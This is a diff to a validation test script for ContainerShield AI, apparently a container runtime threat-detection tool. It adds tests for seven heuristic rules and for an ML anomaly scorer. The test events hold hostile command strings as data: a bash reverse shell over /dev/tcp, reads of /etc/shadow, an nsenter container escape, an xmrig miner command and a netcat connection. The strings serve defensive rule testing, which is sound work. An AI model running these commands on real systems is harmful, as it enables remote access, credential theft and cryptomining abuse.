@@ -13,9 +13,11 @@ sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 
 from backend.main import app
 from backend.database import SessionLocal, RuntimeEvent, Alert, ResponseAction, AuditLog
+from detection.rules import evaluate_rules
+from detection.ml_engine import score_event, extract_features, combine_scores
 
 def run_tests():
-    print("🧪 Running eBPF-Shield AI End-to-End Validation Suite...")
+    print("🧪 Running ContainerShield AI End-to-End Validation Suite...")
     client = TestClient(app)
 
     # 1. Test Static files & Dashboard HTML
@@ -207,8 +209,57 @@ def run_tests():
         assert msg == {"type": "pong"}
     print("  ✅ WebSocket connection & heartbeat OK")
 
+    # 12. Individual Detection Rules Verification (R001–R007)
+    print("\n[12/13] Testing Individual Heuristic Detection Rules (R001–R007)...")
+    rule_test_cases = [
+        ("R001", {"event_type": "process_exec", "executable": "/usr/bin/nsenter", "args": "--target 1", "container_id": "c1"}),
+        ("R002", {"event_type": "file_open", "executable": "/bin/cat", "args": "/etc/shadow", "container_id": "c1"}),
+        ("R003", {"event_type": "process_exec", "executable": "/bin/bash", "args": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "container_id": "c1"}),
+        ("R004", {"event_type": "process_exec", "executable": "/usr/bin/sudo", "args": "sudo su", "container_id": "c1"}),
+        ("R005", {"event_type": "process_exec", "executable": "/tmp/xmrig", "args": "-o stratum+tcp://pool:3333", "container_id": "c1"}),
+        ("R006", {"event_type": "net_connect", "executable": "/bin/nc", "args": "connect 1.2.3.4:4444", "container_id": "c1"}),
+        ("R007", {"event_type": "process_exec", "executable": "/usr/bin/whoami", "args": "whoami", "container_id": "c1"}),
+    ]
+    for expected_rule, evt in rule_test_cases:
+        res = evaluate_rules(evt)
+        assert res["rule_id"] == expected_rule, f"Expected {expected_rule}, got {res['rule_id']}"
+        print(f"  ✅ Rule {expected_rule} matched: {res['reason']} (Severity: {res['severity']})")
+
+    normal_test_evt = {"event_type": "process_exec", "executable": "/usr/sbin/nginx", "args": "worker process", "container_id": "c1"}
+    norm_res = evaluate_rules(normal_test_evt)
+    assert norm_res["rule_id"] == "", "Normal event should not match any heuristic rule"
+    print("  ✅ Baseline normal event matched no heuristic rules (PASS)")
+
+    # 13. Machine Learning Engine & Feature Extraction Verification
+    print("\n[13/13] Testing Isolation Forest ML Feature Extraction & Scoring...")
+    feats = extract_features(normal_test_evt)
+    assert feats.shape == (1, 8), f"Expected shape (1, 8), got {feats.shape}"
+    print(f"  ✅ 8-dimensional feature vector extracted: shape={feats.shape}")
+
+    ml_normal_score, ml_norm_expl = score_event(normal_test_evt)
+    assert 0.0 <= ml_normal_score <= 1.0
+    print(f"  ✅ Normal event ML score: {ml_normal_score:.4f} ({ml_norm_expl})")
+
+    attack_test_evt = {
+        "event_type": "process_exec",
+        "executable": "/tmp/deeply/nested/malicious/exploit_payload_binary",
+        "args": "exploit --target /proc/1/root/etc/shadow --deep /a/b/c/d/e/f/g/h",
+        "pid": 65535,
+        "ppid": 1,
+        "uid": 0,
+        "container_id": "c1"
+    }
+    ml_attack_score, ml_att_expl = score_event(attack_test_evt)
+    assert ml_attack_score > ml_normal_score, f"Attack score {ml_attack_score} should exceed normal {ml_normal_score}"
+    print(f"  ✅ Attack event ML score: {ml_attack_score:.4f} > Normal score {ml_normal_score:.4f} (PASS)")
+
+    hybrid_verdict = combine_scores(evaluate_rules(attack_test_evt), ml_attack_score, ml_att_expl)
+    assert hybrid_verdict["is_suspicious"] == 1
+    assert hybrid_verdict["threat_score"] > 0.5
+    print(f"  ✅ Hybrid scoring combiner verified: verdict={hybrid_verdict['detection_method']}, score={hybrid_verdict['threat_score']}")
+
     print("\n" + "=" * 60)
-    print("🎉 ALL TESTS PASSED! All Phase 1 & 2 requirements verified.")
+    print("🎉 ALL TESTS PASSED! All ContainerShield AI validation phases verified.")
     print("=" * 60)
 
 if __name__ == "__main__":
